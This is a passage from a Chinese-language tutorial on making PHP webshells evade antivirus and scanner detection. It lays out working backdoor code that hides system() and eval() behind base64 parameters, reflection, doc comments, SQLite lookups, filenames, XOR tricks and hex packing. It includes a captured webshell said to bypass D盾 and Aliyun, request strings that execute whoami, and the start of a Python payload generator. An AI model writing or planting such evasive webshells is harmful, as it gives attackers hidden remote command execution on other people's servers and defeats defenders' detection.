<h3 id="91-base64">9.1 Base64传参</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$decrpt</span> <span class="token operator">=</span> <span class="token global">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$decrps</span> <span class="token operator">=</span> <span class="token global">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$arrs</span> <span class="token operator">=</span> <span class="token function">explode<span class="token punctuation">(</span></span><span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token variable">$decrpt</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$arrs</span> <span class="token operator">=</span> <span class="token function">explode<span class="token punctuation">(</span></span><span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token function">base64_decode<span class="token punctuation">(</span></span><span class="token variable">$arrs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$arrt</span> <span class="token operator">=</span> <span class="token function">explode<span class="token punctuation">(</span></span><span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token variable">$decrps</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$arrt</span> <span class="token operator">=</span> <span class="token function">explode<span class="token punctuation">(</span></span><span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token function">base64_decode<span class="token punctuation">(</span></span><span class="token variable">$arrt</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">call_user_func<span class="token punctuation">(</span></span><span class="token variable">$arrs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$arrt</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>传参内容：</p>
<pre class="codehilite language-php"><code class=" language-php">a<span class="token operator">=</span>c3lzdGVt   <span class="token comment" spellcheck="true"> //system的base64加密
</span>b<span class="token operator">=</span>d2hvYW1p   <span class="token comment" spellcheck="true"> //whoami的base64加密</span></code></pre>


<p>也可以尝试使用其他编码或者加密方式进行传参</p>
<h3 id="92">9.2 函数构造传参</h3>
<p>可以用一些定义函数的函数来进行传参绕过，比如使用 <code>register_tick_function()</code> 这个函数</p>
<pre class="codehilite language-php"><code class=" language-php">register_tick_function <span class="token punctuation">(</span> callable <span class="token variable">$function</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> mixed $<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool</code></pre>


<p>例子如下：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token global">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">declare</span><span class="token punctuation">(</span>ticks<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
register_tick_function <span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token global">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h2 id="10">10 自定义函数绕过</h2>
<p>通过自定义函数，将恶意代码内容隐藏于自定义函数当中，再进行拼接执行</p>
<h3 id="101">10.1 简单自定义函数</h3>
<p>这个要与其他的姿势进行结合，目前没办法通过简单自定义函数进行免杀</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">out<span class="token punctuation">(</span></span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">zhixin<span class="token punctuation">(</span></span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">system<span class="token punctuation">(</span></span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">post<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">run<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">out<span class="token punctuation">(</span></span>zhixin<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">out<span class="token punctuation">(</span></span><span class="token function">post<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">run<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h3 id="102">10.2 读取已定义函数</h3>
<p>获取某个类的全部已定义的常量，不管可见性如何定义</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">public</span> <span class="token scope">ReflectionClass<span class="token punctuation">::</span></span><span class="token function">getConstants<span class="token punctuation">(</span></span>void<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">array</span></code></pre>


<p>例子如下：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token string">'Sy'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token string">'st'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> c <span class="token operator">=</span> <span class="token string">'em'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$para1</span><span class="token punctuation">;</span>
<span class="token variable">$para2</span><span class="token punctuation">;</span>
<span class="token variable">$reflector</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string">'Test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">97</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$para1</span> <span class="token operator">=</span> <span class="token variable">$reflector</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getConstant<span class="token punctuation">(</span></span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$para2</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$para1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'_POST'</span><span class="token punctuation">,</span><span class="token string">'_GET'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$_request</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span>$<span class="token variable">$_request</span> <span class="token keyword">as</span> <span class="token variable">$_key</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$_value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        $<span class="token variable">$_key</span><span class="token operator">=</span>  <span class="token variable">$_value</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$para2</span><span class="token punctuation">(</span><span class="token variable">$_value</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h2 id="11">11 读取字符串绕过</h2>
<p>重点还是放在高危函数上，通过读取各种东西来获得对应字符串</p>
<h3 id="111">11.1 读取注释</h3>
<p>这里用到读取注释的函数</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token scope">ReflectionClass<span class="token punctuation">::</span></span>getDocComment</code></pre>


<p>例子如下：</p>
<pre class="codehilite language-php"><code class=" language-php">    <span class="token comment" spellcheck="true">/**   
    * system($_GET[aabyss]);
    */</span>  
<span class="token keyword">class</span> <span class="token class-name">User</span>   
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getDocComment<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$comment</span> <span class="token punctuation">,</span> <span class="token number">14</span> <span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">eval<span class="token punctuation">(</span></span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h3 id="112">11.2 读取数据库</h3>
<p>可以通过 <code>file_put_contents</code> 文件写入函数入一个Sqlite的数据库</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$datatest</span> <span class="token operator">=</span> <span class="token string">"[文件的base64编码]"</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents<span class="token punctuation">(</span></span><span class="token string">'./要写入的文件名'</span><span class="token punctuation">,</span> <span class="token function">base64_decode<span class="token punctuation">(</span></span><span class="token variable">$datatest</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>然后通过PHP读取数据库内容提取高危函数，从而达到WebShell免杀效果</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"数据库文件名"</span>

<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">"sqlite:"</span> <span class="token punctuation">.</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$sql_stmt</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare<span class="token punctuation">(</span></span><span class="token string">'select * from test where name="system"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql_stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$sql_stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">queryString</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h3 id="113">11.3 读取目录</h3>
<p><code>FilesystemIterator</code> 是一个迭代器，可以获取到目标目录下的所有文件信息</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">public</span> <span class="token scope">FilesystemIterator<span class="token punctuation">::</span></span>next <span class="token punctuation">(</span> void <span class="token punctuation">)</span> <span class="token punctuation">:</span> void</code></pre>


<p>可以尝试使用 <code>file_put_contents</code> 写入一个名为 <code>system.aabyss</code> 的空文件，然后遍历目录拿到字符串 <code>system</code> ，成功ByPass</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$fi</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token function">dirname<span class="token punctuation">(</span></span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$fi</span> <span class="token keyword">as</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$i</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">__toString<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'aabyss'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"> //判断后缀名为.aabyss的文件（其他特殊后缀也行）
</span>        <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$i</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">__toString<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> //从system.aabyss提取出system高危函数
</span><span class="token punctuation">}</span>
<span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>为什么要写入为 <code>system.aabyss</code> 这个文件名呢，因为特殊后缀能让代码快速锁定文件，不至于提取文件名提取到其他文件了</p>
<h2 id="12">12 多姿势配合免杀</h2>
<p>将以上提到的相关姿势，进行多种配合嵌套，实现免杀效果</p>
<h3 id="121">12.1 样例一</h3>
<p>刚开始看这个样例我还是挺惊讶的，仔细分析了一波，发现还是挺简单的，但重在思路
这个样例使用了异或+变换参数的手法，成功规避了正则匹配式，具有实战意义</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token operator">~</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token string">'$&lt;&gt;/'</span><span class="token operator">^</span><span class="token string">'{{{{'</span><span class="token punctuation">;</span>@$<span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">(</span>@$<span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>这时候，就可以执行GET传参：<code>?_=system&amp;__=whoami</code> 来执行whoami命令</p>
<p>由8.1讲到PHP中如何异或，我们就先把最前面这部分拆出来看看</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token operator">~</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token string">'$&lt;&gt;/'</span><span class="token operator">^</span><span class="token string">'{{{{'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">
//即 '$&lt;&gt;/' ^ '{{{{'
</span><span class="token comment" spellcheck="true">//即 "$&lt;&gt;/" 这部分字符串与后面 "{{{{" 这部分字符串异或</span></code></pre>


<p>所以由我们前面所学的知识，加上自己动手实践一下，可以发现异或结果为 <code>_GET</code></p>
<p>所以整个PHP语句解密后，再将 <code>_</code> 替换为 <code>a</code>，将 <code>__</code> 替换为 <code>b</code>，则原PHP转化为：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>


<p>当我们给 <code>a</code> 传 <code>system</code>，给 <code>b</code> 传 <code>whoami</code>，原式就会变成这样</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token function">system<span class="token punctuation">(</span></span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>既然上面的代码你看懂了，拿不妨看一下下面魔改的代码：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token operator">~</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token string">'$&lt;&gt;/'</span><span class="token operator">^</span><span class="token string">'{{{{'</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">'$+4(/'</span> <span class="token operator">^</span> <span class="token string">'{{{{{'</span><span class="token punctuation">;</span>@$<span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">(</span>@$<span class="token punctuation">{</span><span class="token variable">$___</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>直接用 Godzilla 哥斯拉来连接，如下：</p>
<p><img alt="魔改连接哥斯拉.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729085000-10irzrt.png-w331s"></p>
<p>当然这里使用到 <code>assert</code> 高危函数，只能用于 <code>php</code> 在 <code>5.*</code> 的版本，相关姿势读者不妨自行拓展一下哈哈~</p>
<h3 id="122">12.2 样例二</h3>
<p>这个免杀马是最近捕获到的，可以轻松过D盾、阿里云等一众查杀引擎~</p>
<p><img alt="ll0sxg0e.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729085000-11ykpqg.png-w331s"></p>
<p><img alt="ll0sx462.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729085000-12qrjwu.png-w331s"></p>
<p>这个样例使用了字符串截取+编解码转换+参数回调的手法，成功规避了正则匹配式，具有实战意义</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token php"><span class="token delimiter">&lt;?php</span>
<span class="token function">phpinfo<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">Car</span><span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">encode<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$num1</span><span class="token operator">=</span><span class="token function">base64_encode<span class="token punctuation">(</span></span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">base64_decode<span class="token punctuation">(</span></span><span class="token variable">$num1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token global">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">pack<span class="token punctuation">(</span></span><span class="token string">"H*"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        @<span class="token variable">$post</span><span class="token operator">=</span><span class="token function">base64_encode<span class="token punctuation">(</span></span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'Qxi*37yz'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        @<span class="token variable">$post1</span><span class="token operator">=</span><span class="token function">base64_decode<span class="token punctuation">(</span></span>@<span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$post1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">Xt<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">eval<span class="token punctuation">(</span></span><span class="token this">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">encode<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$t</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">;</span>
<span class="token variable">$t</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">Xt<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?&gt;</span></span></code></pre>


<p>这时候，就可以执行POST传参：<code>num=2&amp;Qxi*37yz=6173797374656d282777686f616d6927293b62</code> 来执行whoami命令</p>
<p>这个PHP内定义了两个函数，分别是 <code>encode()</code> 和 <code>Xt()</code>，我们先看 <code>encode()</code>：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">encode<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$num1</span><span class="token operator">=</span><span class="token function">base64_encode<span class="token punctuation">(</span></span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">base64_decode<span class="token punctuation">(</span></span><span class="token variable">$num1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token global">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">pack<span class="token punctuation">(</span></span><span class="token string">"H*"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    @<span class="token variable">$post</span><span class="token operator">=</span><span class="token function">base64_encode<span class="token punctuation">(</span></span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'Qxi*37yz'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token variable">$post1</span><span class="token operator">=</span><span class="token function">base64_decode<span class="token punctuation">(</span></span>@<span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$post1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>


<p>传入了两个参数，参数名分别为 <code>num</code> 和 <code>Qxi*37yz</code>，这个函数的输出为 <code>$post1</code>，关键就在于以下这一行代码：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token global">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">pack<span class="token punctuation">(</span></span><span class="token string">"H*"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>


<p>然后我们根据上文提到的知识点0.8、1.5和2.1以及2.4，可以了解到这一行代码的意思：</p>
<ul>
<li><code>substr()</code> 函数将传进去的 <code>Qxi*37yz</code> 参数字符串，删掉前 <code>num</code> 个字符和后 <code>num</code> 个字符（截取中间部分的内容）</li>
<li><code>pack("H*",...)</code> 函数将处理后的 <code>Qxi*37yz</code> 参数字符串进行十六进制编码转换</li>
<li><code>foreach()</code> 将原本的 <code>$_POST</code> 变量替换为经过十六进制编码转换后的字符串</li>
</ul>
<p>注：这里可能有些绕，多上手尝试一下就明白了</p>
<p>接下来我们来看 <code>Xt()</code> 这个函数：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">Xt<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">eval<span class="token punctuation">(</span></span><span class="token this">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">encode<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>


<p>它将 <code>encode()</code> 函数的执行结果带入到 <code>eval()</code> 高危函数当中，即：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">Xt<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">eval<span class="token punctuation">(</span></span><span class="token variable">$post1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"> //encode()函数的输出为$post1
</span><span class="token punctuation">}</span></code></pre>


<p>那假设我们要执行 <code>whoami</code> 命令，那就要让 <code>$post1</code> 等于 <code>system('whoami');</code>，这没毛病吧？</p>
<p>所以结合来看，我们先要生成16进制的字符串：</p>
<p><img alt="whoami转十六进制.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729086000-13tuhnm.png-w331s"></p>
<p>但眼尖的师傅可能会发现，为什么最前面要加个 <code>a</code> 以及最后面要加个 <code>b</code> 呢？
那是因为上面有 <code>substr()</code> 函数啊，会删掉前 <code>num</code> 个字符和后 <code>num</code> 个字符（截取中间部分的内容），小傻瓜~所以现在懂了吗？</p>
<p>所以整体参数的传参流程如下：</p>
<p><img alt="参数传参流程.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729086000-14bmuxb.png-w331s"></p>
<ul>
<li>刚开始传入参数：<code>num</code>=<code>2</code>，<code>Qxi*37yz</code>=<code>6173797374656d282777686f616d6927293b62</code></li>
<li>第一步：先根据 <code>substr()</code>，从num=2开始截取到倒数第2位，于是 <code>Qxi*37yz</code> 便等于 <code>73797374656d282777686f616d6927293b</code></li>
<li>第二步：再根据 <code>pack("H*",...)</code>，将 <code>Qxi*37yz</code>=<code>73797374656d282777686f616d6927293b</code> 从16进制转为字符串即 <code>system('whoami');</code></li>
<li>第三步：最后根据 <code>foreach()</code>，将内容返还给原本的值，使得 <code>encode()</code> 函数的输出变量 <code>$post1</code> 为 <code>system('whoami');</code></li>
<li>第四步：再在 <code>Xt()</code> 函数当中，用 <code>eval()</code> 高危函数执行php语句 <code>system('whoami');</code>,便成功执行系统命令 <code>whoami</code></li>
</ul>
<p>当然这个PHP木马也能用蚁剑来连接，前提是需要写一个编码器，如果你懂原理了，相信你分分钟就能写出来~</p>
<p>这里的话，微信的 <code>@Elvery</code> 师傅还写了一个直接生成Payload一键传参的Python脚本，师傅们可以参考一下：</p>
<pre class="codehilite language-python"><code class=" language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64

<span class="token comment" spellcheck="true"># 指定num参数和要执行的PHP代码
</span>num <span class="token operator">=</span> <span class="token number">5</span>
php_code <span class="token operator">=</span> <span class="token string">'echo "Hello, world!";'</span>

<span class="token comment" spellcheck="true"># 把PHP代码转换为十六进制字符串
